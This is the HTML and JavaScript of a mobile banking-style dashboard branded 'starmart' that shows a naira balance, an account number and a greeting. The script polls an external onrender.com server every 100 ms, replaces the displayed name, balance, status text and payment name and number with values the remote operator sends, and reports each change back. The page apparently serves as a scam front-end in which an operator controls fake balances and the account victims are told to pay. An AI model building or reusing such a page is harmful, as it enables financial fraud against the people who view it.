  <style>
body {
  font-family: 'Arial', sans-serif;
  margin: 0;
  padding: 0;
  line-height: 1.6;
}

/* Top Ad Styles */
.top {
	position: fixed;
	top: 0;
	background: linear-gradient(to bottom, #0066ff, #e6f0ff);
	margin: 0;
	width: 100%;
	padding: 10px 20px;
	z-index: 1000;
	border-bottom: 2px solid #fff;
	box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
	box-sizing: border-box;
}

/* First Nav */
.nav {
	display: flex;
	width: 100%;
	justify-content: space-between;	
	align-items: center;
	margin-bottom: 20px;
}
.menu-toggle {
	background: transparent;
	color: #fff;
	font-size: 22px;
	font-weight: 800;
	border: 2px solid #fff;
}
.user-avatar {         
	width: 36px;            
	height: 36px;            
	border-radius: 50%;            
	cursor: pointer; 
	background: #fff;
	color: #0066ff;
	display: flex;
	justify-content: center;
	align-items: center;
}
	  
.user-avatar p {
	font-weight: 800;
	text-align: center;
}

/* Second Nav */
.navTwo {
	display: flex;
	width: 100%;
	justify-content: space-between;	
	align-items: center;
	margin-bottom: 15px;
}
.navTwo p {
	margin: 0;
	font-size: 12px;
	color: #333;
	font-weight: 600; 
}
.wrap {
	width: 80%;
	white-space: nowrap;  
	overflow: hidden;
	text-overflow: ellipsis;
}
.navTwo h4 {
	color: #fff;
	margin: 0;
}

.accountCopy {
	display: flex;
	align-items: center;
	margin: 0;
	justify-content: right;
	color: #fff;
	transform: scale(1);
	transition: color 0.4s ease, transform 0.4s ease;
}
	  
/* Third Nav */
.navThree {
	background: rgba(0, 102, 255, 0.2);
	padding: 20px;
	border-radius: 10px;
}
	  
.navThree h4 {
	color: #fff;
	font-weight: 700;
	margin: 0;
}
	  
.boardHead {
	display: flex;
	justify-content: space-between;
	margin-bottom: 25px;
}
.boardHead i {
	margin-right: 2px;
}
.boardHead p {
	font-size: 12px;
	margin: 0;
	color: #333;
	font-weight: 700; 
}
.boardLeg {
	display: flex;
	justify-content: space-between;
	align-items: flex-end;
}
.boardLeg button {
	display: flex;
	justify-content: center;
	background: dodgerblue;
	align-items: center;
	font-size: 14px;
	color: #fff;
	height: 25px;
	width: 30px;
	border-radius: 50%;
}
.available p {
	font-size: 10px;
	margin: 0;
	color: #333;
	font-weight: 700; 
	display: flex;
	justify-content: right;
}
.available h4 {
	display: flex;
	margin: 0;
	font-size: 12px;
	justify-content: right;
}
.available span {
	font-size: 18px;
	margin: 0px 0px 0px 5px;
	padding: 0;
}
/* Content */
.content {
  padding: 0.5rem;
}

  </style>

<body>
  <div class="top">
	  <div class="nav">
		  <button class="menu-toggle" id="menuToggle">	
			  <i class="fas fa-bars"></i> 	
		  </button>
		  <div class="user-avatar">
			  <p id="avatar"></p>
		  </div>
	  </div>

	  <div class="navTwo">
		  <div class="greetings">
			  <p id="updateHour"></p>
			  <h4 class="wrap" id="name"></h4>
		  </div>
		  <div class="demoAcc">
			  <p>Your Account Number</p>
			  <div class="accountCopy" onclick="copy(savedInfo.demoAcc, this)">
				  <i class="material-icons">file_copy</i>
				  <h4 id="demoAcc"></h4>
			  </div>
		  </div>
	  </div>

	  <div class="navThree">
		  <div class="boardHead">
			  <div class="currency">
				  <h4>Balance Update</h4>
				  <p>Currency:NGN•PREMIUM•Alt:<span id="realAcc"></span></p>
			  </div>
			  <h4 class="smallLogo"><i class="fa fa-balance-scale" aria-hidden="true"></i><strong>starmart</strong></h4>
		  </div>
		  <div class="boardLeg">
			   <button class="balance-toggle" id="toggleBalance">
				   <i class="fas fa-eye"></i>      
			   </button>
			  <div class="available">	 
				  <p>Available Balance</p>
				  <h4>&#8358;<span id="amount"></span></h4> 
			  </div>
		  </div>
	  </div>
	  
  </div>


  <!-- Main Content -->
  <main class="content">
   
  </main>


</body>
	<script src="../sw.js"></script>
	<script>
		// SENDER
		function sender(payload) {
			const url = 'https://send-39yi.onrender.com/api/messages';  
			fetch(url, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify(payload)    
			});  
		}
		// Update theme-color based on time of day
		function updateGreet() {
			const hour = new Date().getHours();
			let updatedHour;
			if (hour < 12) {
				updatedHour = 'Good Morning';   
			} else if (hour < 18) {
				updatedHour = 'Good Afternoon';
			} else {
				updatedHour = 'Good Evening';
			}
  
			document.getElementById('updateHour').textContent = updatedHour;
		}
		// Update on load and every minute
		updateGreet();
		setInterval(updateGreet, 60000);

		// MAIN CODE
		let lastMessageId = localStorage.getItem('latestId') || 0;
		const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));

		// To Copy demoAcc
		function copy(copytext, host) {
			navigator.clipboard.writeText(copytext);
			const originalText = host.innerHTML;
			host.innerHTML = `<h4>Copied</h4>`;
			
			setTimeout(() => {
				host.innerHTML = originalText; 
			}, 2000);
		}
		// Display
		function displaySavedInfo() {	
			// Fill Name and Avatar
			const name = savedInfo.name;
			const words = name.split(' ');
			const avatar = words[0][0] + words[words.length - 1][0];

			document.getElementById('demoAcc').textContent = savedInfo.demoAcc;
			document.getElementById('realAcc').textContent = savedInfo.realAcc;
			document.getElementById('name').textContent = name;
			document.getElementById('avatar').textContent = avatar;
			document.getElementById('amount').textContent = savedInfo.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
			//document.getElementById('update').textContent = savedInfo.update;
			//document.getElementById('payName').textContent = savedInfo.payName;	
			//document.getElementById('payNumber').textContent = savedInfo.payNumber;
		}
		
        // Function to fetch new messages using long-polling
        async function fetchMessages() {
            try {
                const response = await fetch(`https://send-39yi.onrender.com/in/messages?lastMessageId=${lastMessageId}`);
                const newMessages = await response.json();

                if (newMessages.length > 0) {
                    extractMessages(newMessages);
                    // Update last message ID
                    lastMessageId = newMessages[newMessages.length - 1].id;
                    localStorage.setItem('latestId', lastMessageId);
                }
            } catch (error) {
                console.error('Error fetching messages:', error);
            } finally {
                // Immediately poll again
                setTimeout(fetchMessages, 100);
            }
        }

		// Extract New Messages, Save/Update
        function extractMessages(messages) {
            messages.forEach(message => {
				if(savedInfo.userId.toLowerCase() === message.userId.toLowerCase()){
					console.log('For User');
					if(message.name){
						savedInfo.name = message.name;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, name: savedInfo.name });
					}
					if(message.amount){
						savedInfo.amount = message.amount;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, amount: savedInfo.amount });
					}
					if(message.update){
						savedInfo.update = message.update;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: savedInfo.update });
					}
					if(message.payName){
						savedInfo.payName = message.payName;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
					}
					if(message.payNumber){
						savedInfo.payNumber = message.payNumber;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: `${savedInfo.payName} ${savedInfo.payNumber}` });
						
					}
					displaySavedInfo()
                } else {
                    console.log('Not For User');
                }
            });
        }
    
        
        // Start polling when page loads
        window.addEventListener('load', () => {
            fetchMessages(); 
			displaySavedInfo()
        });
	</script>
</html>
